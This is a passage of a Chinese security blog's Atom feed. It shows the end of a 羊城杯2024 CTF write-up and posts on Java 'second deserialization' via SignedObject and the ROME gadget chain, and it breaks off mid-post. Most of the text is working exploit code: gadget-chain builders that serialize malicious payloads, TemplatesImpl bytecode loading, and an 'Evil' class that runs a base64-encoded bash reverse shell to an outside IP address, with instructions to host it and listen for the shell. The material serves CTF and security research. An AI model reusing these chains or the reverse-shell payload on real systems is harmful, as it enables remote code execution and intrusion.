map2.put(pojoNode,<span class="string">&quot;333&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Field field=HashMap.class.getDeclaredField(<span class="string">&quot;loadFactor&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(map1,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Field field1=HashMap.class.getDeclaredField(<span class="string">&quot;loadFactor&quot;</span>);</span><br><span class="line">        field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field1.set(map2,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Field field3=HashMap.class.getDeclaredField(<span class="string">&quot;loadFactor&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(map3,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Field field4=HashMap.class.getDeclaredField(<span class="string">&quot;loadFactor&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(map4,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(map1,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        hashMap.put(map2,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        hashMap.put(map3,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        hashMap.put(map4,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        setHashMapValueToNull(map1, pojoNode);<span class="comment">//为了在HashMap.put时候就触发,通过反射变成null</span></span><br><span class="line">        setHashMapValueToNull(map2, pojoNode);</span><br><span class="line">        setHashMapValueToNull(map3, pojoNode2);</span><br><span class="line">        setHashMapValueToNull(map4, pojoNode2);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> serialize2base64(hashMap);</span><br><span class="line">        string2file(poc, <span class="string">&quot;poc.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; Object <span class="title function_">createWithoutConstructor</span> <span class="params">(Class classToInstantiate )</span></span><br><span class="line">            <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        <span class="keyword">return</span> createWithoutConstructor(classToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithoutConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs )</span></span><br><span class="line">            <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        objCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        sc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (T)sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setHashMapValueToNull</span><span class="params">(Map map, Object key)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tableField</span> <span class="operator">=</span> HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        tableField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] table = (Object[]) tableField.get(map);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Object node : table) &#123;</span><br><span class="line">            <span class="keyword">if</span> (node == <span class="literal">null</span>) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            Class&lt;?&gt; nodeClass = node.getClass();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">keyField</span> <span class="operator">=</span> nodeClass.getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">            keyField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">k</span> <span class="operator">=</span> keyField.get(node);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (k != <span class="literal">null</span> &amp;&amp; k.equals(key)) &#123;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">valueField</span> <span class="operator">=</span> nodeClass.getDeclaredField(<span class="string">&quot;value&quot;</span>);</span><br><span class="line">                valueField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                valueField.set(node, <span class="literal">null</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>vps上的恶意类:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDcuMTQ4Ljc1LjIwMi8xMjM0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>打成jar包 放在http服务等待获取</p><p>vps同时监听反弹shell端口即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;羊城杯2024-Web-题解&quot;&gt;&lt;a href=&quot;#羊城杯2024-Web-题解&quot; class=&quot;headerlink&quot; title=&quot;羊城杯2024 Web 题解&quot;&gt;&lt;/a&gt;羊城杯2024 Web 题解&lt;/h1&gt;&lt;p&gt;总算没有爆零, 解出了两题, ez_java</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>二次反序列化</title>
    <link href="http://example.com/2024/08/21/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2024/08/21/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-08-21T05:44:37.000Z</published>
    <updated>2024-08-21T13:55:26.682Z</updated>
    
    <content type="html"><![CDATA[<h2 id="认识"><a href="#认识" class="headerlink" title="认识"></a>认识</h2><p>首先利用到的是<code>java.security</code> 这个包</p><p><code>java.security</code> 包是 Java 平台中用于提供安全框架和各种安全功能的核心包。它包含了用于管理和实现安全性相关的类和接口，例如加密、数字签名、密钥管理、访问控制、认证和权限等。这个包中的类广泛用于保护数据和应用程序的安全性。</p><p>简单介绍下二次反序列化，顾名思义，就是反序列化两次，其主要意义是绕过<strong>黑名单的限制或不出网利用</strong></p><h2 id="利用连"><a href="#利用连" class="headerlink" title="利用连"></a>利用连</h2><h3 id="SignedObject"><a href="#SignedObject" class="headerlink" title="SignedObject"></a>SignedObject</h3><p>在<code>java.security.SignedObject</code>这个类中, 构造器将传入的可序列化对象进行了一次序列化</p><p><code>getObject</code>方法又对构造器序列化后的对象(<code>this.content</code>)进行了反序列化 如下图:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240821142310512.png" alt="image-20240821142310512"></p><p>而这个<code>getObject</code>很明显就是一个getter, 那么就可以配合之前的Rome链, CB1链来调用</p><p>根据它的构造器. 利用下面这种方式来创建实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SeconUserial</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchAlgorithmException &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(恶意对象,kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="结合rome链"><a href="#结合rome链" class="headerlink" title="结合rome链"></a>结合rome链</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.ShellCode.*;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.Tools.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SeconUnserial</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">evilHashMap</span> <span class="operator">=</span> getEvilObj();</span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(evilHashMap,kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(SignedObject.class, signedObject);</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(objectBean, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> serialize2base64(hashMap);</span><br><span class="line">        string2file(poc, <span class="string">&quot;poc.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap <span class="title function_">getEvilObj</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> getEvilTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line">        <span class="comment">// EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(objectBean, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="结合commons-beanutils链"><a href="#结合commons-beanutils链" class="headerlink" title="结合commons-beanutils链"></a>结合commons-beanutils链</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPair;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPairGenerator;</span><br><span class="line"><span class="keyword">import</span> java.security.Signature;</span><br><span class="line"><span class="keyword">import</span> java.security.SignedObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.ShellCode.getEvilTemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.Tools.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SeconUnserial2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">evilHashMap</span> <span class="operator">=</span> getEvilObj();</span><br><span class="line"></span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(evilHashMap,kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>&lt;&gt;();</span><br><span class="line">        setFieldValue(beanComparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;object&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;();</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        setFieldValue(priorityQueue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;signedObject, <span class="number">1</span>&#125;);</span><br><span class="line">        setFieldValue(priorityQueue, <span class="string">&quot;comparator&quot;</span>, beanComparator);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> serialize2base64(priorityQueue);</span><br><span class="line"></span><br><span class="line">        string2file(poc, <span class="string">&quot;poc2.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap <span class="title function_">getEvilObj</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> getEvilTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line">        <span class="comment">// EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(objectBean, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里getEvilObj可以是任何一条完整的反序列化链条,只要有对应的依赖即可</p><p>当然也可以使用CC来调用getObject方法</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;认识&quot;&gt;&lt;a href=&quot;#认识&quot; class=&quot;headerlink&quot; title=&quot;认识&quot;&gt;&lt;/a&gt;认识&lt;/h2&gt;&lt;p&gt;首先利用到的是&lt;code&gt;java.security&lt;/code&gt; 这个包&lt;/p&gt;
&lt;p&gt;&lt;code&gt;java.security&lt;/code</summary>
      
    
    
    
    
    <category term="Java安全" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Java反序列化之ROME反序列化</title>
    <link href="http://example.com/2024/08/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2024/08/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-08-20T10:21:08.000Z</published>
    <updated>2024-08-31T04:43:58.058Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是ROME"><a href="#什么是ROME" class="headerlink" title="什么是ROME"></a>什么是ROME</h2><p>简单来说, ROME工具库实现Java对象和XML数据之间的转换</p><h2 id="环境依赖"><a href="#环境依赖" class="headerlink" title="环境依赖"></a>环境依赖</h2><p>依然使用 jdk8u65</p><p>rome依赖:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ROME反序列化使用动态字节码加载也就是我们熟悉的TemplatesImpl这个类来组成gadget</p><h2 id="链子分析"><a href="#链子分析" class="headerlink" title="链子分析"></a>链子分析</h2><p>在CB1链中已经知道了TemplatesImpl#getOutputProperties这个getter方法会触发newITransformer方法导致类加载, 实际上这里也是同样的原理, 不同的只是谁来调用这个getter</p><h3 id="ToStringBean"><a href="#ToStringBean" class="headerlink" title="ToStringBean"></a>ToStringBean</h3><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240820183813233.png" alt="image-20240820183813233"></p><p>这里的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(<span class="built_in">this</span>._beanClass);</span><br></pre></td></tr></table></figure><p>用来获取一个类的getter, 之后的for循环对这些getter进行了调用. 虽然这个方法是private, 但它的一个重载无参public方法对其进行了调用</p><p>那么接下来就是寻找toString在哪里调用了</p><p>ROME中有一个EqualsBean类它的hashcode方法间接调用了toString方法, 且这里的<code>_obj</code>可控</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240820185015385.png" alt="image-20240820185015385"></p><p>之后套上hashMap的hashcode方法, 链子就完整了</p><p>那么就可以编写poc了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.Tools.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RomeUnserial</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] evilCodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Code\\Java-code\\ROMEUnseria\\target\\test-classes\\evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] evil = &#123;evilCodes&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(equalsBean, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, evil);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> serialize2base64(hashMap);</span><br><span class="line">        string2file(poc, <span class="string">&quot;poc.txt&quot;</span>);</span><br><span class="line">        InspectB64Poc(<span class="string">&quot;poc.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ObjectBean"><a href="#ObjectBean" class="headerlink" 